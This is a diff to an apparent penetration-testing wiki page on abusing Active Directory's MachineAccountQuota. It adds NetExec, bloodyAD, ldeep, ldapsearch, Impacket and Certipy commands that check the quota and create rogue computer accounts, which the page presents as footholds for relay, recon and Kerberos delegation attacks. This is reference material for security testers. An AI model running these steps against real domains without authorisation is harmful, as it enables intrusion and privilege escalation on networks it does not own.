@@ -8,7 +8,7 @@
 
 There are multiple ways attackers can leverage that power.
 
-* [Force client authentications](../mitm-and-coerced-authentications/), [relay those authentications](broken-reference) to domain controllers using LDAPS, and take advantage of authenticated sessions to create a domain computer account. This account can then be used as a foothold on the AD domain to operate authenticated recon (i.e. [with BloodHound](../../recon/bloodhound.md) for example)
+* [Force client authentications](../mitm-and-coerced-authentications/), [relay those authentications](../ntlm/relay.md) to domain controllers using LDAPS, and take advantage of authenticated sessions to create a domain computer account. This account can then be used as a foothold on the AD domain to operate authenticated recon (i.e. [with BloodHound](../../recon/bloodhound.md) for example)
 * Create a computer account and use it for [Kerberos RBCD attacks](../kerberos/delegations/#resource-based-constrained-delegations-rbcd) when leveraging owned accounts with sufficient permissions (i.e. ACEs like `GenericAll`, `GenericWrite` or `WriteProperty`) against a target machine
 * Create a computer account and use it for a [Kerberos Unconstrained Delegation](../kerberos/delegations/#unconstrained-delegations) attack when leveraging owned accounts with sufficient permissions (i.e. the `SeEnableDelegationPrivilege` user right)
 * Profit from special rights that members of the Domain Computers group could inherit
@@ -18,13 +18,13 @@ There are multiple ways attackers can leverage that power.
 
 {% tabs %}
 {% tab title="UNIX-like" %}
-The [MachineAccountQuota](https://github.com/ShutdownRepo/CrackMapExec-MachineAccountQuota) module (for [CrackMapExec](https://github.com/mpgn/CrackMapExec)) can be used to check the value of the MachineAccountQuota attribute.
+The [MachineAccountQuota](https://github.com/ShutdownRepo/CrackMapExec-MachineAccountQuota) module (for [NetExec](https://github.com/Pennyw0rth/NetExec) (Python)) can be used to check the value of the MachineAccountQuota attribute:
 
 ```bash
-cme ldap $DOMAIN_CONTROLLER -d $DOMAIN -u $USER -p $PASSWORD -M maq
+nxc ldap $DOMAIN_CONTROLLER -d $DOMAIN -u $USER -p $PASSWORD -M maq
 ```
 
-Alternatively, it can be done manually with the following Python code.
+Alternatively, it can be done manually with the Python library [ldap3](https://pypi.org/project/ldap3/) ([source](https://github.com/cannatag/ldap3)):
 
 ```bash
 import ldap3
@@ -40,6 +40,24 @@ connection = ldap3.Connection(server = server, user = user, password = password,
 connection.bind()
 connection.search(target_dn,"(objectClass=*)", attributes=['ms-DS-MachineAccountQuota'])
 print(connection.entries[0])
+```
+
+With [bloodyAD](https://github.com/CravateRouge/bloodyAD) (Python):
+
+```bash
+bloodyad -d $DOMAIN -u $USER -p $PASSWORD --host $DOMAIN_CONTROLLER get object 'DC=acme,DC=local' --attr ms-DS-MachineAccountQuota
+```
+
+With [ldeep](https://github.com/franc-pentest/ldeep) (Python):
+
+```bash
+ldeep ldap -d $DOMAIN -u $USER -p $PASSWORD -s $DOMAIN_CONTROLLER search '(objectclass=domain)' | jq '.[]."ms-DS-MachineAccountQuota"'
+```
+
+With ldapsearch (openldap (C)):
+
+```bash
+ldapsearch -x -H ldap://$DOMAIN_CONTROLLER -b 'DC=acme,DC=local' -D "$USER@$DOMAIN" -W -s sub "(objectclass=domain)" | grep ms-DS-MachineAccountQuota 
 ```
 {% endtab %}
 
@@ -70,7 +88,9 @@ The [Impacket](https://github.com/SecureAuthCorp/impacket) script [addcomputer](
 addcomputer.py -computer-name 'SomeName$' -computer-pass 'SomePassword' -dc-host "$DC_HOST" -domain-netbios "$DOMAIN" "$DOMAIN"/"$USER":"$PASSWORD"
 ```
 
-Testers can also use [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) instead with the `--add-computer` option, like [this](https://arkanoidctf.medium.com/hackthebox-writeup-forest-4db0de793f96)
+`addcomputer.py` also has an option `-computer-group` for adding a group to which the account will be added. Because if omitted, the group `CN=Computers` will be used by default.
+
+Testers can also use [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) (Python) instead with the `--add-computer` option, like [this](https://arkanoidctf.medium.com/hackthebox-writeup-forest-4db0de793f96)
 
 {% hint style="info" %}
 When using [Impacket](https://github.com/SecureAuthCorp/impacket)'s addcomputer script for the creation of a computer account, the "SAMR" method is used by default (instead of the LDAPS one). At the time of writing (10th of December, 2021), the SAMR method creates the account without SPNs. In this case, they could be added later on with [addspn.py](https://github.com/dirkjanm/krbrelayx) (Python). By default, computer accounts have the following SPNs set:
@@ -82,6 +102,26 @@ Host/hostname
 Host/hostname.domain_fqdn
 ```
 {% endhint %}
+
+With [bloodyAD](https://github.com/CravateRouge/bloodyAD) (Python):
+
+```bash
+bloodyad -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --host "$DC_HOST" add computer 'SomeName$' 'SomePassword'
+```
+
+With [ldeep](https://github.com/franc-pentest/ldeep) (Python):
+
+```bash
+ldeep ldap -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -s ldap://"$DC_HOST" create_computer 'SomeName$' 'SomePassword'
+```
+
+With [Certipy](https://github.com/ly4k/Certipy) (Python):
+
+```bash
+certipy account create -username "$USER"@"$DOMAIN" -password "$PASSWORD" -dc-ip "$DC_HOST" -user 'SomeName$' -pass 'SomePassword' -dns 'SomeDNS'
+```
+
+Certipy also offers option to set the UPN (`-upn`), SAM account name (`-sam`), SPNS (`-spns`) while creating the computer.
 {% endtab %}
 
 {% tab title="Windows" %}
